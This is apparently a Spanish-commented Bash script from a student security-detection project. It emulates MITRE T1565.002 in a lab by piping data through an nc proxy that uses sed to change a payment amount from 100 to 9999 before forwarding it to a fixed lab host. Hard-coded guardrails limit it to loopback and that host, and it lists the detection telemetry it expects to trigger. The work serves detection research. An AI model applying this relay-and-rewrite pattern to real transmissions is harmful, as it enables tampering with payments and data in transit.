#!/usr/bin/env bash
# ============================================================================
# ATA026 · T1565.002 Transmitted Data Manipulation — ataque MANUAL (TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1565.002 Data Manipulation: Transmitted Data Manipulation
#           (tactica Impact)
# Fuente  : custom (escrito por el TFG)
# Objetivo: MANIPULAR el dato EN TRANSITO: un PROXY LOCAL (encadenado con `nc`)
#           reescribe el cuerpo (`importe=100` -> `importe=9999`) ANTES de
#           reenviarlo al receptor del laboratorio. El efecto NO es el robo, es
#           la ALTERACION: el receptor recibe un sha256 DISTINTO del enviado.
# Destino : proxy 127.0.0.1:<PROXY_PORT> -> receptor del HOST 192.168.65.1:<RPORT>
# Ejecuta : desde /home/angel/lab-attack/ATA026 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# ⚠️⚠️ GUARDARRAILES DUROS (abortan si no se cumplen):
#   - El proxy escucha SOLO en 127.0.0.1 (loopback); el destino es SOLO el
#     receptor del laboratorio (192.168.65.1:9091). NUNCA otro host/puerto.
#   - La redistribucion del cuerpo se hace con un `sed` FIJO (no configurable).
#   - `timeout` en el listener (nunca queda colgado). No se rompe la red del lab.
#
# Telemetria esperada (ver README §5):
#   - execve de `nc`  (proxy + emisor) -> 80792 (deteccion; T1565.002-S1).
#   - execve de `sed` (reescritura en transito) -> 80792 (deteccion; S2).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA026/*` (S3).
#
# Prueba de exito (INDEPENDIENTE de la alerta): el `sha256` del cuerpo esperado
#   TRAS la manipulacion != el `sha256` del original; el `sink.log` del HOST
#   registra un cuerpo con ese MISMO sha manipulado (alteracion probada).
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA026"
PROXY_BIND="127.0.0.1"
PROXY_PORT=8082
HOST="192.168.65.1"
RPORT=9091
ORIG="${BASE}/original.txt"

echo "ATA026 · T1565.002 Transmitted Data Manipulation (proxy local reescribe en transito) — custom (manual)"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
for t in nc sed timeout sleep sha256sum awk; do
  if ! command -v "$t" >/dev/null 2>&1; then
    echo "ERROR: $t no disponible" >&2
    exit 1
  fi
done

# --- GUARDARRAILES DUROS ---
case "$PROXY_BIND" in
  127.0.0.1) : ;;
  *) echo "ERROR: proxy '$PROXY_BIND' no es loopback; ABORTADO" >&2; exit 1 ;;
esac
case "$HOST:$RPORT" in
  192.168.65.1:9091) : ;;
  *) echo "ERROR: destino '$HOST:$RPORT' no es el receptor del laboratorio; ABORTADO" >&2; exit 1 ;;
esac
case "$ORIG" in
  "$HOME/lab-attack/ATA026"*) : ;;
  *) echo "ERROR: origen '$ORIG' fuera de lab-attack/ATA026; ABORTADO" >&2; exit 1 ;;
esac

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

proxy_pid=""
killproxy() { [ -n "$proxy_pid" ] && kill "$proxy_pid" 2>/dev/null || true; }
trap killproxy EXIT

# 0) Dato original a transmitir (transferencia de juguete).
if [ ! -f "$ORIG" ]; then
  printf 'cuenta=ACME;importe=100;moneda=EUR;ref=INV-2026-001\n' > "$ORIG"
fi
sha_orig=$(sha256sum "$ORIG" | awk '{print $1}')
# sha256 del cuerpo ESPERADO tras la manipulacion en transito.
sha_manip=$(sed 's/importe=100/importe=9999/' "$ORIG" | sha256sum | awk '{print $1}')
echo "sha256_original =${sha_orig}"
echo "sha256_manipulado_esperado=${sha_manip}"

# 1) PROXY LOCAL de manipulacion en transito: entra -> sed reescribe -> sale al receptor.
echo ">>> proxy local reescribe el cuerpo en transito hacia ${HOST}:${RPORT}"
timeout 10 nc -l "$PROXY_BIND" "$PROXY_PORT" \
  | sed -u 's/importe=100/importe=9999/' \
  | nc -q 1 "$HOST" "$RPORT" &
proxy_pid=$!
sleep 0.7

# 2) EMISION del dato original A TRAVES del proxy (el dato sale intacto del emisor).
echo ">>> emision del dato original a traves del proxy"
nc -q 1 "$PROXY_BIND" "$PROXY_PORT" < "$ORIG"
sleep 2
killproxy; proxy_pid=""
trap - EXIT
sleep 1

# 3) PRUEBA DEL EFECTO (independiente de la alerta).
echo "--- estado final ---"
if [ "$sha_orig" != "$sha_manip" ]; then
  echo "MANIP_TRANSITO=OK (el cuerpo recibido por el receptor difiere del original; sha manipulado=${sha_manip})"
else
  echo "MANIP_TRANSITO=FALLO (el sha no cambio: la manipulacion no ocurrio)" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
